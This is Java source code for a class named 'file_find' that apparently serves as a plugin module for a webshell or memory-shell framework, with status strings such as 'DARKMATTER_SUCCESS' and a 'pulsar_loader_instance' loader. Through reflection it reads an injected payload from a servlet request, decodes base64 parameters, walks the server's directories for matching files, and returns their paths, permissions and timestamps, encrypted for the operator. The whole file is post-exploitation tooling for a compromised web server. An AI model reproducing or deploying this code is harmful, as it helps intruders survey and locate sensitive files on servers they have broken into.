import java.io.File;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.nio.file.Path;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.PosixFileAttributeView;
import java.nio.file.attribute.PosixFilePermission;
import java.text.SimpleDateFormat;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

public class file_find extends ClassLoader
{
    public file_find(ClassLoader objParent) { super(objParent); }
    public file_find() { super(file_find.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szSplitter = mapParams.get("splitter");
            StringBuffer sb = new StringBuffer();

            String z0 = mapParams.get("z0");
            String z1 = mapParams.get("z1");

            if (z0 == null || z1 == null)
            {
                osClient.write("{\"status\":false,\"msg\":\"Missing z0 or z1 parameters\"}".getBytes());
                return true;
            }

            String szPattern = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8);
            String szDirPaths = new String(Base64.getDecoder().decode(z1), StandardCharsets.UTF_8);

            Pattern regexPattern = fnToJavaPattern(szPattern);
            String[] asDirs = szDirPaths.split(",");

            StringBuilder sbResultsJson = new StringBuilder();
            sbResultsJson.append("[");
            boolean bFirstFile = true;
            boolean bHasValidDir = false;

            for (String szDir : asDirs)
            {
                File dirFile = new File(szDir.trim());
                if (!dirFile.exists() || !dirFile.isDirectory())
                    continue;

                bHasValidDir = true;

                try
                {
                    Path startPath = dirFile.toPath();
                    List<Path> lsMatchedPath = new ArrayList<>();
                    Files.walk(startPath).forEach(path -> {
                        String name = path.getFileName().toString();
                        if (regexPattern.matcher(name).find())
                            lsMatchedPath.add(path);
                    });

                    for (Path path : lsMatchedPath)
                    {
                        File f = path.toFile();
                        BasicFileAttributes attrs = Files.readAttributes(path, BasicFileAttributes.class);

                        if (!bFirstFile)
                            sbResultsJson.append(",");

                        bFirstFile = false;

                        sbResultsJson.append("{")
                            .append("\"name\":\"").append(fnEscapeJson(f.getName())).append("\",")
                            .append("\"path\":\"").append(fnEscapeJson(f.getAbsolutePath())).append("\",")
                            .append("\"type\":\"").append(f.isDirectory() ? "Directory" : "File").append("\",")
                            .append("\"permission\":\"").append(fnGetFilePermission(path)).append("\",")
                            .append("\"created\":\"").append(fnDatetimeConversion(attrs.creationTime().toMillis())).append("\",")
                            .append("\"last_modified\":\"").append(fnDatetimeConversion(attrs.lastModifiedTime().toMillis())).append("\",")
                            .append("\"last_accessed\":\"").append(fnDatetimeConversion(attrs.lastAccessTime().toMillis())).append("\"")
                            .append("}");
                    }
                }
                catch (Exception ex)
                {

                }
            }

            sbResultsJson.append("]");

            if (!bHasValidDir) {
                sb.append("{\"status\":false,\"msg\":\"Cannot find any valid directory\"}");
            } else {
                sb.append("{\"status\":true,\"results\":" + sbResultsJson.toString() + "}");
            }

            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }

    private Pattern fnToJavaPattern(String szPattern)
    {
        szPattern = szPattern.trim();

        if ((szPattern.contains("*") || szPattern.contains("?")) && !szPattern.matches(".*[\\.\\[\\]\\(\\)\\{\\}\\^\\$\\+\\|].*"))
            {
            szPattern = "^" + Pattern.quote(szPattern).replace("*", ".*").replace("?", ".") + "$";
            return Pattern.compile(szPattern, Pattern.CASE_INSENSITIVE);
        }
        
        return Pattern.compile(szPattern, Pattern.CASE_INSENSITIVE);
    }

    private String fnGetFilePermission(Path path)
    {
        StringBuffer sb = new StringBuffer();
        try
        {
            boolean bIsDir = Files.isDirectory(path);
            sb.append(bIsDir ? "d" : "-");

            PosixFileAttributeView posix = Files.getFileAttributeView(path, PosixFileAttributeView.class);
            if (posix != null)
            {
                // Unix-like

                Set<PosixFilePermission> perms = posix.readAttributes().permissions();
                
                sb.append(perms.contains(PosixFilePermission.OWNER_READ) ? "r" : "-");
                sb.append(perms.contains(PosixFilePermission.OWNER_WRITE) ? "w" : "-");
                sb.append(perms.contains(PosixFilePermission.OWNER_EXECUTE) ? "x" : "-");
                sb.append(perms.contains(PosixFilePermission.GROUP_READ) ? "r" : "-");
                sb.append(perms.contains(PosixFilePermission.GROUP_WRITE) ? "w" : "-");
                sb.append(perms.contains(PosixFilePermission.GROUP_EXECUTE) ? "x" : "-");
                sb.append(perms.contains(PosixFilePermission.OTHERS_READ) ? "r" : "-");
                sb.append(perms.contains(PosixFilePermission.OTHERS_WRITE) ? "w" : "-");
                sb.append(perms.contains(PosixFilePermission.OTHERS_EXECUTE) ? "x" : "-");
            }
            else
            {
                // Windows

                sb.append(Files.isReadable(path) ? "r" : "-");
                sb.append(Files.isWritable(path) ? "w" : "-");
                sb.append(Files.isExecutable(path) ? "x" : "-");
                sb.append("------");
            }
        }
        catch (Exception ex)
        {
            return "---------";
        }

        return sb.toString();
    }

    private String fnDatetimeConversion(long millis)
    {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return sdf.format(new Date(millis));
    }

    private String fnEscapeJson(String str) {
        if (str == null) return "";
        return str.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\b", "\\b")
                  .replace("\f", "\\f")
                  .replace("\n", "\\n")
                  .replace("\r", "\\r")
                  .replace("\t", "\\t");
    }
}